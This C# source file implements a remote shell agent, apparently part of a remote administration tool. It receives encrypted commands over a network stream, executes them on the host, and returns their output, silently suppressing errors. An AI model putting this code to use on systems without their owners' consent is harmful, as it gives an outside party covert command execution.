using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using bc.srv.Classes.Comunicator;

namespace bc.srv.Modules.Remote_Shell
{
    internal class RemoteShellAgent
    {
        private readonly MsgManager mm;

        private readonly NetworkStream myStream;

        private string sCmdEnd;

        private StringBuilder sLastOutPut = new StringBuilder(); // ULTIMO OUTPUT


        private bool stopListener;
        private readonly ShellWorker sw;

        public RemoteShellAgent(NetworkStream clientStream)
        {
            this.myStream = clientStream;
            this.mm = new MsgManager(clientStream);

            this.sw = new ShellWorker();

            //EVENTI
            this.sw.StdOut += this.RemShell_StdOut;
            this.sw.StdError += RemShell_StdError;

            this.sCmdEnd = this.sw.SCmdComplete; // COMANDO DI CONCLUSIONE
        }

        /// <summary>
        ///     Avvia thread di ascolto per Remote Shell
        /// </summary>
        public void StartShellListener()
        {
            var t = new Thread(this.ShellListener);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     Listener Shell
        /// </summary>
        private void ShellListener()
        {
            while (SrvData.Instance.isConnected && !this.stopListener)
                try
                {
                    Thread.Sleep(10);

                    var cmd = this.mm.WaitForEncryMessageRicorsive(10000);

                    if (this.stopListener)
                        break;

                    if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                    {
                        var cmdSplit = cmd.Split('|');

                        switch (cmdSplit[0])
                        {
                            case "EXEC":
                                this.RunCmd(cmdSplit[1]);
                                break;

                            case "EXIT":
                                this.RunCmd("EXIT");
                                this.stopListener = true;
                                break;
                        }
                    }
                }
                catch
                {
                }

            // ARRIVO QUI PERCHè IL LISTENER è MORTO

            if (SrvData.Instance.nsListaCanali.Contains(this.myStream))
                SrvData.Instance.nsListaCanali.Remove(this.myStream);


            try
            {
                this.myStream.Close();
            }
            catch
            {
            }
        }
        //------------------------------------


        /// <summary>
        ///     Esegue un comando
        /// </summary>
        /// <param name="cmd"></param>
        private void RunCmd(string cmd)
        {
            try
            {
                this.sLastOutPut = new StringBuilder();
                this.sw.Execute(cmd);
            }
            catch
            {
            }
        }

        /// <summary>
        ///     Invio la risposta dell'ultima esecuzione
        /// </summary>
        private void SendAnswer()
        {
            try
            {
                this.mm.SendLargeEncryMessage(this.sLastOutPut.ToString(), 10000);
            }
            catch
            {
            }
        }

        /// <summary>
        ///     Evento richiamato quando arriva una nuova linea di output
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void RemShell_StdOut(object sender, DataReceivedEventArgs e)
        {
            var line = e.Data;

            if (line != this.sw.SCmdComplete)
                this.sLastOutPut.AppendLine(line);
            else
                this.SendAnswer();
        }

        private static void RemShell_StdError(object sender, DataReceivedEventArgs e)
        {
            //Console.ForegroundColor = ConsoleColor.Red;
            //Console.WriteLine(e.Data);
            //Console.ResetColor();
        }
    }
}